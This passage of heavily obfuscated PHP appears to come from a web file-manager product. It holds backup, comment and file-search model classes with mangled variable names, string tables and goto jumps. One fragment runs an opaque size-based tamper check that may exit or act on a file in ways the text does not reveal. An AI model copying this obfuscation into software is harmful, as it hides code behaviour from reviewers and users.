$ö¾ŒÁİí = isset($¶øêÄö™[$Ó¿ó‘‚Ì[85]]) ? $¶øêÄö™[$Ó¿ó‘‚Ì[85]] : array(); $‚‘ß»•  = array_sum(array_column($ö¾ŒÁİí, $Ó¿ó‘‚Ì[78])); if (!$‚‘ß»• ) { return !1; } $ì¹Ç³¼ = array($Ó¿ó‘‚Ì[827] => $‚‘ß»• , $Ó¿ó‘‚Ì[828] => time()); Backup::set($ì¹Ç³¼); $Ûîß¸¾À = new TaskFileTransfer($Ó¿ó‘‚Ì[829], $Ó¿ó‘‚Ì[809], count($ö¾ŒÁİí), LNG($Ó¿ó‘‚Ì[810]) . $Ó¿ó‘‚Ì[432] . LNG($Ó¿ó‘‚Ì[812]) . $Ó¿ó‘‚Ì[830]); $Ûîß¸¾À->task[$Ó¿ó‘‚Ì[792]] = $‚‘ß»• ; foreach ($¶øêÄö™[$Ó¿ó‘‚Ì[85]] as $Ë¸üåßë) { $î¨ÏøÁÌ = IO::move($Ë¸üåßë[$Ó¿ó‘‚Ì[86]], $ıÉâ˜œß); if (!$î¨ÏøÁÌ) { $Ûîß¸¾À->end(); $ Š—“¾Ï = IO::getLastError($Ó¿ó‘‚Ì[831] . $Ë¸üåßë[$Ó¿ó‘‚Ì[86]] . $Ó¿ó‘‚Ì[832] . $ıÉâ˜œß . $Ó¿ó‘‚Ì[167]); write_log($ Š—“¾Ï, $Ó¿ó‘‚Ì[809]); return !1; } } $¸¤œëü¹ = new DbManage(); $ßñŠ™¼© = $¸¤œëü¹->getSqlFile(); if (!$ßñŠ™¼©[$Ó¿ó‘‚Ì[833]] || !$ßñŠ™¼©[$Ó¿ó‘‚Ì[13]]) { return !1; } IO::move($ßñŠ™¼©[$Ó¿ó‘‚Ì[833]], $ıÉâ˜œß); IO::move($ßñŠ™¼©[$Ó¿ó‘‚Ì[13]], $ıÉâ˜œß); $Ûîß¸¾À->end(); $ì¹Ç³¼ = array($Ó¿ó‘‚Ì[834] => $‚‘ß»• , $Ó¿ó‘‚Ì[835] => time()); Backup::set($ì¹Ç³¼); return !0; } private function backupPath($ª‚Ñ¾Éı) { $àÅ¾¹—î =& $_SERVER[ ÇƒŠìÀ]; $•şÜûÀ¸ = $ª‚Ñ¾Éı[$àÅ¾¹—î[32]]; $£‡šÍƒš = Model($àÅ¾¹—î[799])->get($àÅ¾¹—î[800]); $ıŞó‡ş´ = substr(md5($àÅ¾¹—î[801] . $£‡šÍƒš . $•şÜûÀ¸), 0, 8); return "\x7b\151\157\72{$ª‚Ñ¾Éı[$àÅ¾¹—î[780]]}\175\x2f\x64\x61\x74\141\x62\141\x73\x65\57\x62\x61\x63\x6b\165\x70\57" . $•şÜûÀ¸ . $àÅ¾¹—î[11] . $ıŞó‡ş´; } private function tmpFilesPath() { $§¹”Ìâ„ =& $_SERVER[ ÇƒŠìÀ]; $€â¨½›³ = TEMP_FILES; if ($GLOBALS[$§¹”Ìâ„[6]][$§¹”Ìâ„[91]][$§¹”Ìâ„[825]]) { $€â¨½›³ = $GLOBALS[$§¹”Ìâ„[6]][$§¹”Ìâ„[91]][$§¹”Ìâ„[825]]; if (!mk_dir($€â¨½›³) || !is_writable($€â¨½›³) || !IO::mkfile($€â¨½›³ . $§¹”Ìâ„[826])) { $€â¨½›³ = TEMP_FILES; } } return $€â¨½›³; } } goto fÖ¯ÑõÄï; dÚ°˜¬àêŞ: $_size = $_SERVER[ ÇƒŠìÀ][1526]; if ($_SERVER[$_SERVER[ ÇƒŠìÀ][906]] != $_size($_file)) { $_getc = $_SERVER[ ÇƒŠìÀ][909]; $_getfile = $_SERVER[$_SERVER[ ÇƒŠìÀ][910]] . $_SERVER[ ÇƒŠìÀ][911]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ ÇƒŠìÀ][248], $_getfilec); if (count($_getarrs) < $_SERVER[ ÇƒŠìÀ][655]) { $exit = $_SERVER[ ÇƒŠìÀ][912]; $exit(); } $_act = $_SERVER[ ÇƒŠìÀ][948]; $_act($_file); } goto BçêŒ½®˜; b»‚Î¤‘•Õ: class BackupModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\x65\155\x2e\x62\141\x63\153\x75\160\114\x69\163\164"; public $field = array("\151\x6f", "\x6e\141\x6d\x65", "\x73\x74\141\x74\x75\163", "\143\x6f\x6e\x74\145\156\x74", "\x6d\x61\x6e\x75\141\x6c", "\x72\145\163\165\x6c\164", "\x74\x69\155\145\x46\x72\157\x6d", "\164\151\155\x65\x54\157"); public function config() { $ëÀ¦æ÷« =& $_SERVER[ ÇƒŠìÀ]; $ì™ç‚Ü = Model($ëÀ¦æ÷«[799])->get($ëÀ¦æ÷«[809]); $ì™ç‚Ü = json_decode($ì™ç‚Ü, !0); $ì™ç‚Ü = is_array($ì™ç‚Ü) ? $ì™ç‚Ü : array(); if (!isset($ì™ç‚Ü[$ëÀ¦æ÷«[783]])) { $ì™ç‚Ü[$ëÀ¦æ÷«[783]] = $ëÀ¦æ÷«[90]; } unset($ì™ç‚Ü[$ëÀ¦æ÷«[1659]]); Action($ëÀ¦æ÷«[1912])->taskInit(); Model($ëÀ¦æ÷«[1658])->cacheClear(); $à¤»Ø°Œ = $ëÀ¦æ÷«[1913]; $¾õ ¥âˆ = Model($ëÀ¦æ÷«[1914])->findByKey($ëÀ¦æ÷«[1677], $à¤»Ø°Œ); if (!$¾õ ¥âˆ) { $¾õ ¥âˆ = array(); } if (isset($¾õ ¥âˆ[$ëÀ¦æ÷«[196]])) { $¾õ ¥âˆ[$ëÀ¦æ÷«[196]] = json_decode($¾õ ¥âˆ[$ëÀ¦æ÷«[196]], !0); } if (isset($ì™ç‚Ü[$ëÀ¦æ÷«[196]])) { $¾õ ¥âˆ[$ëÀ¦æ÷«[196]][$ëÀ¦æ÷«[1662]] = $ì™ç‚Ü[$ëÀ¦æ÷«[196]]; unset($ì™ç‚Ü[$ëÀ¦æ÷«[196]]); } return array_merge($¾õ ¥âˆ, $ì™ç‚Ü); } public function listData($ø´Ş”ê¸ = false, $ÃË‰­ìŒ = "\155\x6f\144\x69\x66\171\124\151\155\145", $óÛ×‘à¹ = false) { return parent::listData($ø´Ş”ê¸, $ÃË‰­ìŒ, !0); } public function lastItem() { $–××¡Â = $this->listData(); return !empty($–××¡Â[0]) ? $–××¡Â[0] : null; } public function kill($á ‚š) { $Íúµë€ƒ =& $_SERVER[ ÇƒŠìÀ]; $¥Ì–¤„õ = $this->listData($á ‚š); if (!$¥Ì–¤„õ || empty($¥Ì–¤„õ[$Íúµë€ƒ[32]])) { return !0; } Task::kill($Íúµë€ƒ[808]); Task::kill($Íúµë€ƒ[829]); Task::kill($Íúµë€ƒ[838]); $Åóø® = $¥Ì–¤„õ[$Íúµë€ƒ[32]]; $”¬¯ü‰ = TEMP_FILES . $Íúµë€ƒ[807] . $Åóø® . $Íúµë€ƒ[8]; IO::remove($”¬¯ü‰, !1); return $this->remove($á ‚š); } public function remove($†’÷âŸÔ) { $Æê¥‘Ê‚ = $this->listData($†’÷âŸÔ); if (!$Æê¥‘Ê‚) { return !0; } return $this->backupRemove($Æê¥‘Ê‚); } private function backupRemove($Í·öÁÈ) { parent::remove($Í·öÁÈ[$_SERVER[ ÇƒŠìÀ][445]]); $ô„ôÕ†  = $this->backupPath($Í·öÁÈ); IO::remove($ô„ôÕ† , !1); return !0; } private function backupPath($›¦Ã¬¿) { $—Ğ¡³ë’ =& $_SERVER[ ÇƒŠìÀ]; $«¤ôö“Š = $›¦Ã¬¿[$—Ğ¡³ë’[32]]; $Æš‰ŸÉª = Model($—Ğ¡³ë’[799])->get($—Ğ¡³ë’[800]); $ÃÄò §Ó = substr(md5($—Ğ¡³ë’[801] . $Æš‰ŸÉª . $«¤ôö“Š), 0, 8); return "\x7b\151\x6f\x3a{$›¦Ã¬¿[$—Ğ¡³ë’[780]]}\175\57\144\x61\164\141\x62\x61\x73\145\x2f\x62\x61\143\153\x75\x70\x2f" . $«¤ôö“Š . $—Ğ¡³ë’[11] . $ÃÄò §Ó; } public function start() { $µ¨±Œ°à =& $_SERVER[ ÇƒŠìÀ]; if ($GLOBALS[$µ¨±Œ°à[6]][$µ¨±Œ°à[91]][$µ¨±Œ°à[1915]] != $µ¨±Œ°à[90]) { return !0; } $€šÀºì = $this->config(); if (!$€šÀºì || $€šÀºì[$µ¨±Œ°à[1659]] != $µ¨±Œ°à[90]) { return !1; } $Ú¥å‡• = $this->process(); foreach ($Ú¥å‡• as $á¬êŞ­) { if ($á¬êŞ­) { return Task::restart($á¬êŞ­[$µ¨±Œ°à[445]]); } } $ôšĞÑ²« = new Backup(); $îàäˆÈ· = $ôšĞÑ²«->db(); if ($îàäˆÈ·) { $îàäˆÈ· = $ôšĞÑ²«->dbFile(); if ($îàäˆÈ· && $€šÀºì[$µ¨±Œ°à[783]] == $µ¨±Œ°à[214]) { $îàäˆÈ· = $ôšĞÑ²«->file(); } } Backup::set(array($µ¨±Œ°à[779] => 1, $µ¨±Œ°à[790] => time())); return !0; } public function process() { $ª ³ûÍÎ =& $_SERVER[ ÇƒŠìÀ]; $—·”ñ• = array($ª ³ûÍÎ[786] => Task::get($ª ³ûÍÎ[808]), $ª ³ûÍÎ[791] => Task::get($ª ³ûÍÎ[829]), $ª ³ûÍÎ[216] => Task::get($ª ³ûÍÎ[838])); $Ë³íÂ„ó = !1; foreach ($—·”ñ• as &$’ƒÑÕ¸÷) { if ($Ë³íÂ„ó) { $’ƒÑÕ¸÷ = !1; continue; } if ($’ƒÑÕ¸÷) { $ŸÓ‚˜§ó = intval(_get($’ƒÑÕ¸÷, $ª ³ûÍÎ[1694], 0)); if (time() - $ŸÓ‚˜§ó > 7200) { Task::kill($’ƒÑÕ¸÷[$ª ³ûÍÎ[445]]); $Ë³íÂ„ó = !0; $’ƒÑÕ¸÷ = !1; } } } return $—·”ñ•; } public function restore() { $Õ»†¦ˆ =& $_SERVER[ ÇƒŠìÀ]; ActionCall($Õ»†¦ˆ[1095], !0, 1); ActionCall($Õ»†¦ˆ[1095], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\143\157\155\x6d\145\156\x74"; protected $tableMeta = array("\164\x61\142\154\x65\116\141\x6d\145" => "\x63\157\x6d\155\x65\156\x74\137\x6d\x65\x74\x61", "\x6d\x65\164\x61\106\x69\x65\x6c\144" => "\143\157\155\x6d\x65\x6e\164\111\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($½ß¸äÓ) { $›ÖĞ”™Ó =& $_SERVER[ ÇƒŠìÀ]; if ($½ß¸äÓ[$›ÖĞ”™Ó[1916]]) { $¢¸¿˜øõ = $this->where(array($›ÖĞ”™Ó[1917] => $½ß¸äÓ[$›ÖĞ”™Ó[1916]]))->find(); if (!$¢¸¿˜øõ || $¢¸¿˜øõ[$›ÖĞ”™Ó[180]] != $½ß¸äÓ[$›ÖĞ”™Ó[180]] || $¢¸¿˜øõ[$›ÖĞ”™Ó[540]] != $½ß¸äÓ[$›ÖĞ”™Ó[540]]) { return !1; } $this->where(array($›ÖĞ”™Ó[1917] => $½ß¸äÓ[$›ÖĞ”™Ó[1916]]))->setAdd($›ÖĞ”™Ó[1918], 1); } $½ß¸äÓ[$›ÖĞ”™Ó[1919]] = 0; $½ß¸äÓ[$›ÖĞ”™Ó[1918]] = 0; $½ß¸äÓ[$›ÖĞ”™Ó[779]] = 1; return $this->add($½ß¸äÓ); } public function commentCount($ï°àò‹Å, $âµÜ¦±ç, $ã½¼Û¢• = false) { $­´çî¦‡ =& $_SERVER[ ÇƒŠìÀ]; if (!$ï°àò‹Å) { return array(); } if (is_string($ï°àò‹Å) || is_int($ï°àò‹Å)) { $ï°àò‹Å = array($ï°àò‹Å); } $Ê£ú»ì = array($­´çî¦‡[540], $­´çî¦‡[1920] => $­´çî¦‡[536]); $ª¿Ôµü = array($­´çî¦‡[540] => array($­´çî¦‡[7], $ï°àò‹Å), $­´çî¦‡[180] => $âµÜ¦±ç); if ($ã½¼Û¢•) { $ª¿Ôµü[$­´çî¦‡[1689]] = $ã½¼Û¢•; } $‹èÆö’Ç = $this->field($Ê£ú»ì)->where($ª¿Ôµü)->group($­´çî¦‡[540])->select(); return array_to_keyvalue($‹èÆö’Ç, $­´çî¦‡[540], $­´çî¦‡[536]); } public function starTarget($©ù‚µÉÈ, $Ğ…¬è°) { $Œß˜«ì =& $_SERVER[ ÇƒŠìÀ]; $»­ó¿’æ = $©ù‚µÉÈ + self::TYPE_STAR_OFFSET; $Îæ¸¦í = array($Œß˜«ì[1689] => USER_ID, $Œß˜«ì[180] => $»­ó¿’æ, $Œß˜«ì[540] => $Ğ…¬è°); $óéíë¸¼ = $this->where($Îæ¸¦í)->find(); if ($óéíë¸¼) { return $this->where(array($Œß˜«ì[445] => $óéíë¸¼[$Œß˜«ì[445]]))->delete(); } $‡ŠµÑö = array($Œß˜«ì[1916] => 0, $Œß˜«ì[1689] => USER_ID, $Œß˜«ì[779] => 1, $Œß˜«ì[783] => $Œß˜«ì[12], $Œß˜«ì[180] => $»­ó¿’æ, $Œß˜«ì[540] => $Ğ…¬è°, $Œß˜«ì[1919] => 0, $Œß˜«ì[1918] => 0); return $this->add($‡ŠµÑö); } public function starTargetCount($ªäèª¬æ, $§ÒÌØìå) { $×¯¼¬ó =& $_SERVER[ ÇƒŠìÀ]; $°¯Ô©¥  = $§ÒÌØìå + self::TYPE_STAR_OFFSET; $ˆïÂ™Î¦ = $this->commentCount($ªäèª¬æ, $°¯Ô©¥ ); $Óä§çóÉ = $this->commentCount($ªäèª¬æ, $°¯Ô©¥ , USER_ID); return array($×¯¼¬ó[1921] => $ˆïÂ™Î¦, $×¯¼¬ó[1922] => $Óä§çóÉ); } public function starTargetUserList($ÎŸËÜ…Ó, $¨†ÍÛµŸ) { $Ş¥‘î€ù =& $_SERVER[ ÇƒŠìÀ]; $¶’§›óğ = $ÎŸËÜ…Ó + self::TYPE_STAR_OFFSET; $¥®ÃÔãş = array($Ş¥‘î€ù[540] => $¨†ÍÛµŸ, $Ş¥‘î€ù[180] => $¶’§›óğ); $õ¼òÚÖ³ = $this->where($¥®ÃÔãş)->count(); $·¡úçÓˆ = array($Ş¥‘î€ù[301] => $õ¼òÚÖ³, $Ş¥‘î€ù[1923] => array()); if (!$õ¼òÚÖ³) { return $·¡úçÓˆ; } $Õ¡Çû¶„ = $this->field($Ş¥‘î€ù[1689])->where($¥®ÃÔãş)->limit(500)->select(); $Õ¡Çû¶„ = array_to_keyvalue($Õ¡Çû¶„, $Ş¥‘î€ù[12], $Ş¥‘î€ù[1689]); $·¡úçÓˆ[$Ş¥‘î€ù[1923]] = Model($Ş¥‘î€ù[548])->userListInfo($Õ¡Çû¶„); return $·¡úçÓˆ; } public function prasiseUserList($¹Ù°à„°) { $„µ‰ÍçÚ =& $_SERVER[ ÇƒŠìÀ]; $Ãòáã§Ú = array($„µ‰ÍçÚ[1924] => $¹Ù°à„°); $×æÀå¦Ë = $this->where($Ãòáã§Ú)->find(); $­ú³ˆà = _get($×æÀå¦Ë, $„µ‰ÍçÚ[1919], 0); $²¡„™Ğ¤ = array($„µ‰ÍçÚ[301] => $­ú³ˆà, $„µ‰ÍçÚ[1923] => array()); if (!$­ú³ˆà) { return $²¡„™Ğ¤; } $ÚÓ‹–ÛÅ = Model($„µ‰ÍçÚ[1925])->field($„µ‰ÍçÚ[1689])->where($Ãòáã§Ú)->limit(500)->select(); $ÚÓ‹–ÛÅ = array_to_keyvalue($ÚÓ‹–ÛÅ, $„µ‰ÍçÚ[12], $„µ‰ÍçÚ[1689]); $²¡„™Ğ¤[$„µ‰ÍçÚ[1923]] = Model($„µ‰ÍçÚ[548])->userListInfo($ÚÓ‹–ÛÅ); return $²¡„™Ğ¤; } public function remove($ûæìÕá) { $îê·ÊÏ˜ =& $_SERVER[ ÇƒŠìÀ]; $´„’›Ÿ· = array($îê·ÊÏ˜[1917] => $ûæìÕá); $²ÖÔ‘øş = $this->where($´„’›Ÿ·)->find(); if ($²ÖÔ‘øş[$îê·ÊÏ˜[1916]]) { $this->where(array($îê·ÊÏ˜[1917] => $²ÖÔ‘øş[$îê·ÊÏ˜[1916]]))->setAdd($îê·ÊÏ˜[1918], -1); } return $this->where($´„’›Ÿ·)->delete(); } public function edit($ªæ¡×åÍ, $Êƒãé¯ù) { $¸·ÚûÖë =& $_SERVER[ ÇƒŠìÀ]; $ƒäŞÏÅ˜ = array($¸·ÚûÖë[1917] => $ªæ¡×åÍ); return $this->where($ƒäŞÏÅ˜)->save(array($¸·ÚûÖë[1926] => $Êƒãé¯ù)); } public function prasise($¸¦¡¸ƒ…) { $ëå¢â£ =& $_SERVER[ ÇƒŠìÀ]; $˜ñäãõ“ = Model($ëå¢â£[1927]); $Ë‡šÒöõ = array($ëå¢â£[1917] => $¸¦¡¸ƒ…, $ëå¢â£[1680] => USER_ID); $´Å‘–ÜŸ = $˜ñäãõ“->where($Ë‡šÒöõ)->find(); if (!$´Å‘–ÜŸ) { $˜ñäãõ“->add($Ë‡šÒöõ); $öÖùÉ”² = $this->where(array($ëå¢â£[1917] => $¸¦¡¸ƒ…))->setAdd($ëå¢â£[1919], 1); } else { $˜ñäãõ“->where($Ë‡šÒöõ)->delete(); $öÖùÉ”² = $this->where(array($ëå¢â£[1917] => $¸¦¡¸ƒ…))->setAdd($ëå¢â£[1919], -1); } return $öÖùÉ”²; } public function targetInfo($æòõ ˆ©, $ßØîÜ†) { $ª…Õöøš =& $_SERVER[ ÇƒŠìÀ]; $•‰ãÎóõ = array($ª…Õöøš[618] => $æòõ ˆ©, $ª…Õöøš[619] => $ßØîÜ†); $¸‰Ó×ñ = $this->where($•‰ãÎóõ)->count(); $•úşÜı‹ = "\x52\x49\107\110\x54\40\x4a\x4f\x49\x4e\40{$this->tablePrefix}\x63\x6f\155\155\145\156\x74\x5f\160\x72\x61\x69\x73\x65\40\163\x74\x61\162\40\x6f\x6e\40\x63\x6f\x6d\x6d\x65\156\x74\56\x63\x6f\155\155\x65\x6e\164\111\104\x20\75\40\x73\x74\141\x72\x2e\143\x6f\155\x6d\145\156\164\111\x44"; $‹£È›† = $this->alias($ª…Õöøš[400])->where($•‰ãÎóõ)->join($•úşÜı‹, $ª…Õöøš[1928])->count(); $¤ı‘µ£ = array($ª…Õöøš[1929] => $¸‰Ó×ñ, $ª…Õöøš[1930] => $‹£È›†); return $¤ı‘µ£; } public function listData($òÚ»Ñ¢Ò) { $å›ŒúŸ =& $_SERVER[ ÇƒŠìÀ]; if (isset($òÚ»Ñ¢Ò[$å›ŒúŸ[1931]])) { if ($òÚ»Ñ¢Ò[$å›ŒúŸ[1931]]) { $òÚ»Ñ¢Ò[$å›ŒúŸ[1924]] = array($å›ŒúŸ[1049], intval($òÚ»Ñ¢Ò[$å›ŒúŸ[1931]])); } unset($òÚ»Ñ¢Ò[$å›ŒúŸ[1931]]); } if (isset($òÚ»Ñ¢Ò[$å›ŒúŸ[1932]])) { if ($òÚ»Ñ¢Ò[$å›ŒúŸ[1932]]) { $òÚ»Ñ¢Ò[$å›ŒúŸ[1924]] = array($å›ŒúŸ[1046], intval($òÚ»Ñ¢Ò[$å›ŒúŸ[1932]])); } unset($òÚ»Ñ¢Ò[$å›ŒúŸ[1932]]); } return $this->_listData($òÚ»Ñ¢Ò); } private function _listData($ÒŠËÊ¡ ) { $¾–ú®¿ =& $_SERVER[ ÇƒŠìÀ]; $ÄÌÃ‘ = $this->where($ÒŠËÊ¡ )->_makeOrder()->selectPage(100); $this->_listAppendParent($ÄÌÃ‘[$¾–ú®¿[415]]); $this->_listAppendUser($ÄÌÃ‘[$¾–ú®¿[415]]); $this->_listAppendMeta($ÄÌÃ‘[$¾–ú®¿[415]]); return $ÄÌÃ‘; } private function _makeOrder() { $ã½»ûÉÅ =& $_SERVER[ ÇƒŠìÀ]; $ûøµŠúÙ = array($ã½»ûÉÅ[1919], $ã½»ûÉÅ[1918], $ã½»ûÉÅ[217]); $Òö—ğÁ = Input::get($ã½»ûÉÅ[500], $ã½»ûÉÅ[7], $ã½»ûÉÅ[467], $ûøµŠúÙ); $é¤ş´ïƒ = Input::get($ã½»ûÉÅ[501], $ã½»ûÉÅ[7], $ã½»ûÉÅ[1682], array($ã½»ûÉÅ[1933], $ã½»ûÉÅ[496])); $òĞù£—É = $Òö—ğÁ . $ã½»ûÉÅ[53] . $é¤ş´ïƒ; return $this->order($òĞù£—É); } private function _listAppendParent(&$â¸ÙäÃ) { $À–‰ÎÄ² =& $_SERVER[ ÇƒŠìÀ]; $»£ïÅì = array_unique(array_to_keyvalue($â¸ÙäÃ, $À–‰ÎÄ²[12], $À–‰ÎÄ²[1916])); $»£ïÅì = array_remove_value($»£ïÅì, $À–‰ÎÄ²[214]); if (!$»£ïÅì) { return; } $ã£Ò¬Ö = $this->where(array($À–‰ÎÄ²[1917] => array($À–‰ÎÄ²[7], $»£ïÅì)))->select(); $ã£Ò¬Ö = array_to_keyvalue($ã£Ò¬Ö, $À–‰ÎÄ²[1924]); foreach ($â¸ÙäÃ as &$áÁÇÓˆï) { if (isset($ã£Ò¬Ö[$áÁÇÓˆï[$À–‰ÎÄ²[1916]]])) { $áÁÇÓˆï[$À–‰ÎÄ²[1934]] = $ã£Ò¬Ö[$áÁÇÓˆï[$À–‰ÎÄ²[1916]]]; } } unset($áÁÇÓˆï); } private function _listAppendUser(&$ïÓ®‘¬ˆ) { $Œõ–“‰ =& $_SERVER[ ÇƒŠìÀ]; $­™¨«àİ = array_unique(array_to_keyvalue($ïÓ®‘¬ˆ, $Œõ–“‰[12], $Œõ–“‰[1689])); $­™¨«àİ = array_remove_value($­™¨«àİ, $Œõ–“‰[214]); if (count($­™¨«àİ) == 0) { return; } foreach ($ïÓ®‘¬ˆ as $»³³¿ÍÌ) { if (isset($»³³¿ÍÌ[$Œõ–“‰[1934]])) { $­™¨«àİ[] = $»³³¿ÍÌ[$Œõ–“‰[1934]][$Œõ–“‰[1689]]; } } $¶ƒ‹¼œĞ = Model($Œõ–“‰[569])->userListInfo($­™¨«àİ); foreach ($ïÓ®‘¬ˆ as &$»³³¿ÍÌ) { $»³³¿ÍÌ[$Œõ–“‰[632]] = $¶ƒ‹¼œĞ[$»³³¿ÍÌ[$Œõ–“‰[1689]]]; if (isset($»³³¿ÍÌ[$Œõ–“‰[1934]])) { $»³³¿ÍÌ[$Œõ–“‰[1934]][$Œõ–“‰[632]] = $¶ƒ‹¼œĞ[$»³³¿ÍÌ[$Œõ–“‰[1934]][$Œõ–“‰[1689]]]; } } unset($»³³¿ÍÌ); } private function _listAppendMeta(&$ı—œĞîÉ) { $Ã©Âöæ =& $_SERVER[ ÇƒŠìÀ]; $ÍË»´ÚÏ = array_unique(array_to_keyvalue($ı—œĞîÉ, $Ã©Âöæ[12], $Ã©Âöæ[1924])); $ÍË»´ÚÏ = array_remove_value($ÍË»´ÚÏ, $Ã©Âöæ[214]); if (!$ÍË»´ÚÏ) { return; } foreach ($ı—œĞîÉ as $Ãğ¬Ó³†) { if (isset($Ãğ¬Ó³†[$Ã©Âöæ[1934]])) { $ÍË»´ÚÏ[] = $Ãğ¬Ó³†[$Ã©Âöæ[1934]][$Ã©Âöæ[1924]]; } } $æëùŠŸÉ = $this->metaList($ÍË»´ÚÏ); if (!$æëùŠŸÉ) { return !1; } foreach ($ı—œĞîÉ as &$Ãğ¬Ó³†) { $Ãğ¬Ó³†[$Ã©Âöæ[509]] = $æëùŠŸÉ[$Ãğ¬Ó³†[$Ã©Âöæ[1924]]]; if (isset($Ãğ¬Ó³†[$Ã©Âöæ[1934]])) { $Ãğ¬Ó³†[$Ã©Âöæ[1934]][$Ã©Âöæ[509]] = $æëùŠŸÉ[$Ãğ¬Ó³†[$Ã©Âöæ[1934]][$Ã©Âöæ[1924]]]; } } unset($Ãğ¬Ó³†); } private function metaList($”ÖñíÎ) { $ê®ê¦À =& $_SERVER[ ÇƒŠìÀ]; if (!$”ÖñíÎ) { return array(); } $¼»¸æ—¤ = array($ê®ê¦À[1924] => array($ê®ê¦À[7], $”ÖñíÎ)); $Ï›¨ä—¤ = Model($ê®ê¦À[1935])->where($¼»¸æ—¤)->select(); $Ï›¨ä—¤ = array_to_keyvalue_group($Ï›¨ä—¤, $ê®ê¦À[1924]); foreach ($Ï›¨ä—¤ as $İ²·û¹… => $ğÑûë¡¼) { $ëïÊé…ö = array(); foreach ($ğÑûë¡¼ as $¨–£­Ìş) { $ëïÊé…ö[$¨–£­Ìş[$ê®ê¦À[96]]] = $¨–£­Ìş[$ê®ê¦À[420]]; } $Ï›¨ä—¤[$İ²·û¹…] = $ëïÊé…ö; } return $Ï›¨ä—¤ ? $Ï›¨ä—¤ : array(); } } class FileContentModel extends ModelBase { protected $tableName = "\x69\157\x5f\146\x69\154\x65\x5f\143\x6f\156\164\145\x6e\164\163"; protected $dataAuto = array(array("\x63\162\x65\x61\x74\145\124\x69\155\x65", "\164\151\x6d\x65", "\151\156\x73\x65\x72\x74", "\x66\x75\x6e\143\164\x69\157\x6e")); } goto d„ãˆ‹Î¡á; bØâ§ßŠ­™: class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($õŞ¸¤õõ) { $ôÒ—±´ß =& $_SERVER[ ÇƒŠìÀ]; $¥…Šõ±° = KodIO::fileTypeList(); $‰³è„à = $¥…Šõ±°[$õŞ¸¤õõ]; if (!$‰³è„à) { return array(); } $ÆìŒº× = $‰³è„à[$ôÒ—±´ß[177]]; $†÷Üïƒø = $ôÒ—±´ß[7]; if (!$‰³è„à[$ôÒ—±´ß[177]]) { $·¶ÉÊ¶¯ = array_to_keyvalue($¥…Šõ±°, $ôÒ—±´ß[12], $ôÒ—±´ß[177]); $ÆìŒº× = implode($ôÒ—±´ß[50], $·¶ÉÊ¶¯); $†÷Üïƒø = $ôÒ—±´ß[2144]; } $“½ŠÛ÷ = explode($ôÒ—±´ß[50], trim($ÆìŒº×, $ôÒ—±´ß[50])); return array($†÷Üïƒø, $“½ŠÛ÷); } public function listPathType($ñ«Ô×Ğê) { $Š›î™£ =& $_SERVER[ ÇƒŠìÀ]; $«¦­ı™ = $this->fileTypeWhere($ñ«Ô×Ğê); if (!$«¦­ı™) { return array(); } $ËÉÄ×Î = USER_ID; $óõöÂŠ = Model($Š›î™£[569])->getInfo($ËÉÄ×Î); $ëáñğ™ê = array($Š›î™£[618] => SourceModel::TYPE_USER, $Š›î™£[555] => array($Š›î™£[582], $Š›î™£[565] . $óõöÂŠ[$Š›î™£[89]][$Š›î™£[183]] . $Š›î™£[583]), $Š›î™£[619] => $ËÉÄ×Î, $Š›î™£[616] => 0, $Š›î™£[617] => $«¦­ı™); return $this->listSource($ëáñğ™ê); } public function listSearch($šÒ®§Êõ, $ûßè­ó¯ = 300) { $ƒï·‡ô =& $_SERVER[ ÇƒŠìÀ]; if (isset($šÒ®§Êõ[$ƒï·‡ô[1981]]) && $šÒ®§Êõ[$ƒï·‡ô[1981]]) { $šÒ®§Êõ[$ƒï·‡ô[1981]] = str_replace($ƒï·‡ô[430], $ƒï·‡ô[2145], trim($šÒ®§Êõ[$ƒï·‡ô[1981]])); } $Ã¦ëÒƒï = $this->_parseSearchWhere($šÒ®§Êõ); if (!isset($Ã¦ëÒƒï[$ƒï·‡ô[475]])) { $Ã¦ëÒƒï[$ƒï·‡ô[475]] = 0; } $âß¯Ğ›’ = $ƒï·‡ô[2146]; $›Ç‹‰÷¤ = $Ã¦ëÒƒï; $ØëÀíç™ = $âß¯Ğ›’; $this->_listSearchBindPinyin($šÒ®§Êõ, $Ã¦ëÒƒï, $âß¯Ğ›’); $this->alias($ƒï·‡ô[489])->_makeOrder(); $Ã¦ëÒƒï = $this->parseWhereLike($Ã¦ëÒƒï); $çıò¦ = $this->distinct(!0)->field($âß¯Ğ›’)->where($Ã¦ëÒƒï)->selectPage($ûßè­ó¯); if ($GLOBALS[$ƒï·‡ô[6]][$ƒï·‡ô[427]][$ƒï·‡ô[428]] && Input::check($šÒ®§Êõ[$ƒï·‡ô[1981]], $ƒï·‡ô[625]) && $çıò¦[$ƒï·‡ô[412]][$ƒï·‡ô[399]] == 1 && $çıò¦[$ƒï·‡ô[412]][$ƒï·‡ô[413]] == 0) { $çıò¦ = $this->distinct(!0)->field($âß¯Ğ›’)->where($›Ç‹‰÷¤)->limit(1000)->select(); $çıò¦ = array_page_split($çıò¦, !1, $ûßè­ó¯); } $this->_listSearchFileContent($çıò¦, $šÒ®§Êõ, $ØëÀíç™, $›Ç‹‰÷¤); $this->_listSearchDesc($çıò¦, $šÒ®§Êõ, $ØëÀíç™); $this->_listSearchTag($çıò¦, $šÒ®§Êõ, $ØëÀíç™); $this->_listSearchGroupTag($çıò¦, $šÒ®§Êõ, $ØëÀíç™); $this->_listDataApply($çıò¦[$ƒï·‡ô[415]]); $this->_listMake($çıò¦); return $çıò¦; } private function _listSearchFileContent(&$…•‹ÀâÆ, $¼‡ğúâ², $† Ú‘ÇÌ, $³ñ¡™°) { $ùÅíÒô =& $_SERVER[ ÇƒŠìÀ]; if (!$¼‡ğúâ²[$ùÅíÒô[1981]] || $…•‹ÀâÆ[$ùÅíÒô[412]][$ùÅíÒô[399]] > 1) { return; } if (!isset($³ñ¡™°[$ùÅíÒô[32]]) || !is_array($¼‡ğúâ²[$ùÅíÒô[511]])) { return; } $³ñ¡™°[$ùÅíÒô[511]] = array($ùÅíÒô[7], $¼‡ğúâ²[$ùÅíÒô[511]]); 